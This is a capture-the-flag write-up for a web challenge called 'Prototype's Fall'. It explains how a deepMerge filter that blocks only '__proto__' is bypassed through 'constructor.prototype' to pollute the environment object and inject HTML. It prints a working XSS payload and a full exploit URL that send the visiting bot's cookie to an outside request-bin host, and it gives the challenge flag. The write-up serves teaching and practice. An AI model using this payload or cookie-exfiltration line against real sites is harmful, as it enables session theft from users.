# Prototype's Fall

Category: Web

## Description

> The system's defenses are built on flawed foundations. Their inheritance isn't as robust as they believe. To exploit their weakness, don't just corrupt the blueprint; manipulate the very essence of their creation – the constructor itself. Twist its purpose, and watch their reality crumble.

A website was attached.

## Solution

A very simple website was attached. It's body contained the following code:

```html
<body id="body" class="dark">
    <div id="glitch-text">PROTO//SYS</div>
    <h1 id="main-text">SYSTEM BOOT...</h1>
    <p>PARAMETERS LOADING...</p>

    <button id="toggle-dark-mode">CYCLE LIGHT SEQUENCE</button>

    <form action="/bot" method="POST">
        <input placeholder="https://example.org" type="text" name="url">
        <input type="submit" value="ANALYZE TARGET">
    </form>

    <script async defer>
        config = getConfig()
        if (getEnv().log) console.log(`Config: darkMode:${config.darkMode} username:${config.username}`)

        body = document.getElementById("body");
        if (config.darkMode) {
            body.classList.add('dark-mode')
        } else {
            body.classList.add('light-mode')
        }

        document.getElementById("toggle-dark-mode").addEventListener('click', function () {
            if (!userConfig) {
                userConfig = {}
            }
            userConfig.darkMode = !config.darkMode
            console.log("user config:", userConfig)

            const currentUrl = new URL(window.location.href)
            currentUrl.searchParams.set("config", JSON.stringify(userConfig))
            window.location.href = currentUrl.toString()
        });

        // NEXT: Add a child in a safe way. For now, only do this in dev mode.
        if (getEnv().devMode) {
            console.log("append child")
            child = document.createElement('div');
            child.innerHTML = getEnv().safeHTML;
            document.body.appendChild(child)
        }
    </script>

</body>
```

In addition, the following script was included in the `head` element, together with some CSS:

```javascript
// Returns the current env setup. Totally hardcoded because who has time for flexibility? No params, just deal with it.
function getEnv() {
    return {
        // devMode: true, // Keeping devMode commented out for production sanity.
        log: false, // Access logs... too boring for us.
    }
}

// Merges two objects deeply. Because shallow merges are for the well-rested.
function deepMerge(dest, src) {
    for (let key in src) {
        if (!src.hasOwnProperty(key)) {
            continue
        }
        if (typeof src[key] !== 'object') {
            dest[key] = src[key];
            continue
        } else if (key === '__proto__') { // This input sanitization? Prototype pollution doesn't stand a chance.
            continue;
        }

        if (!dest[key]) {
            if (Array.isArray(src[key])) {
                dest[key] = []
            } else {
                dest[key] = {};
            }
        }
        deepMerge(dest[key], src[key]);
    }
}

// Gets the config. Defaults, env vars, all that jazz.
function getConfig() {
    config = {
        darkMode: true,
        username: "Anonymous",
    }
    const url = new URL(window.location.href);
    const params = new URLSearchParams(url.search);
    userConfig = JSON.parse(params.get("config"))
    deepMerge(config, userConfig);
    return config
}
```

As the name and the comments hint, the goal of this challenge is to exploit a 
[Prototype Pollution](https://en.wikipedia.org/wiki/Prototype_pollution) vulnerability.

> Prototype pollution is a class of vulnerabilities in JavaScript runtimes that allows attackers to overwrite arbitrary properties in an object's prototype.

Using `getConfig()`, we are able to pass a JSON string in the command line which gets deserialized 
to a Javascript object. If we carefully craft the JSON string, we can inject an attribute that 
will leak into the environment object returned from `getEnv()`, even without direct access to
that object. We'll want to gain control of `getEnv().safeHTML`, allowing us to inject arbitrary
Javascript code into the DOM via `child.innerHTML`. Then, we'll share the malicious URL with
the bot via the `/bot` API.

We'll use some very basic XSS template to try and steal the bot's cookie:

```html
<img src="foo.jpg" onerror="document.location='https://enmcdb7vh9m1.x.pipedream.net?c=' + document.cookie">
```

Packing it into a JSON string as the value of the `config` parameter, we get the following URL:

```
https://prototype-web.2024-bq.ctfcompetition.com/?config={"constructor":{"prototype":{"devMode":true, "safeHTML": "<img src=\"foo.jpg\" onerror=\"document.location='https://enmcdb7vh9m1.x.pipedream.net?c=' %2B document.cookie\">"}}}
```

We submit that to the bot and receive a request containing `CTF{__proto__Pirate}` at our RequestBin.
